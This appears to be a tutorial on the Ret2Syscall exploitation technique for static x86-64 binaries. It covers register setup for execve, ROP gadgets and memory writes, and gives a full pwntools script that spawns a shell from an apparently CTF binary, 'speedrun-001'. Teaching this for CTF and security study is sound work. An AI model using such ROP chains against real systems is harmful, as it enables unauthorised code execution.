# Ret2Syscall Exploit Technique

The **Ret2Syscall** (Return-to-Syscall) technique is used to execute system calls directly by manipulating the programâ€™s stack and redirecting the control flow to a syscall instruction. This exploit is typically used against **static binaries**, where dynamic linking to libc is unavailable, and direct syscalls can be executed.

## Key Components of Ret2Syscall

1. **Registers Configuration for `execve`:**
   To perform the `execve` syscall, we need to set the registers in the following way:
   
   - `rax`: Set to `59` (syscall number for `execve`).
   - `rdi`: Set to the pointer to `"/bin/sh"`, the file to execute.
   - `rsi`: Set to `0`, specifying no arguments passed.
   - `rdx`: Set to `0`, specifying no environment variables.

   These values are used to prepare the syscall:
   
   ```asm
   execve("/bin/sh", NULL, NULL)
   ```

2. **Finding Gadgets:**
   ROP gadgets are small code sequences in the binary that help us set values to the registers. Common gadgets include:
   - **`pop rax ; ret`** to set `rax`.
   - **`pop rdi ; ret`** to set `rdi`.
   - **`pop rsi ; ret`** to set `rsi`.
   - **`pop rdx ; ret`** to set `rdx`.

3. **Writing `/bin/sh` to Memory:**
   Since we need to pass `"/bin/sh"` as a string to the syscall, the string must be written into memory. A writable memory region is required for this.

   Example address of writable memory:
   ```
   0x6b6000 (writable region)
   ```
   The string `/bin/sh` in hexadecimal is:
   ```
   0x2f62696e2f736800
   ```
   
4. **Building the ROP Chain:**
   The ROP chain will first write the string `/bin/sh` into memory and then set the registers to execute the `execve` syscall.

   Example ROP chain for **64-bit** binary:
   
   ```python
   # ROP Gadgets for 64-bit binary
   popRdx = p64(0x4498b5)  # Gadget to set rdx
   popRax = p64(0x415664)  # Gadget to set rax
   popRdi = p64(0x400686)  # Gadget to set rdi
   popRsi = p64(0x4101f3)  # Gadget to set rsi
   writeGadget = p64(0x48d251)  # Gadget to write data to memory
   syscall = p64(0x40129c)  # Syscall instruction
   
   # Write "/bin/sh" to memory
   rop = ''
   rop += popRdx  # Set rdx to the string
   rop += "/bin/sh\x00"  # Null-terminated string
   rop += popRax  # Set rax to the writable memory address
   rop += p64(0x6b6000)  # Address of writable memory
   rop += writeGadget  # Write the string to memory
   
   # Prepare syscall arguments and make the syscall
   rop += popRax  # Set rax to syscall number 59 (execve)
   rop += p64(0x3b)  # Syscall number for execve
   rop += popRdi  # Set rdi to the pointer to "/bin/sh"
   rop += p64(0x6b6000)  # Address of the string
   rop += popRsi  # Set rsi to 0 (no arguments)
   rop += p64(0)  # No arguments
   rop += popRdx  # Set rdx to 0 (no environment variables)
   rop += p64(0)  # No environment variables
   
   rop += syscall  # Make the syscall
   ```

## Exploit Example

Here is an example of a **Python** exploit that automates the **Ret2Syscall** technique using the `pwn` library.

```python
from pwn import *

# Start the target process
target = process('./speedrun-001')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# Gadget to write to memory
writeGadget = p64(0x48d251)

# Syscall instruction for execve
syscall = p64(0x40129c)

# ROP chain to write "/bin/sh" to memory and trigger execve
rop = ''
rop += popRdx
rop += "/bin/sh\x00"  # Null-terminated string "/bin/sh"
rop += popRax
rop += p64(0x6b6000)  # Address to write the string to
rop += writeGadget

# Set up the registers for execve syscall
rop += popRax
rop += p64(0x3b)  # Syscall number for execve
rop += popRdi
rop += p64(0x6b6000)  # Address of "/bin/sh"
rop += popRsi
rop += p64(0)  # No arguments
rop += popRdx
rop += p64(0)  # No environment variables
rop += syscall

# Add padding to the saved return address
payload = "A"*0x408 + rop

# Send the payload and interact with the shell
target.sendline(payload)
target.interactive()
```

## Handling Missing Gadgets: SROP

In some cases, you may not have enough gadgets to perform a `Ret2Syscall` exploit. In these situations, you can use the **SROP (Sigreturn-Oriented Programming)** technique, which allows for more flexible control over the registers and even the instruction pointer (RIP). SROP is useful when you're lacking the gadgets to perform traditional ROP chaining.

## Conclusion

The **Ret2Syscall** technique is a powerful method to exploit **static binaries** by directly invoking syscalls. By controlling the registers and memory via ROP gadgets, attackers can execute arbitrary commands such as spawning a shell (`/bin/sh`) without relying on standard library functions. This technique is commonly used in **stack buffer overflow** or **ROP-based exploits** in CTF challenges and penetration testing scenarios.
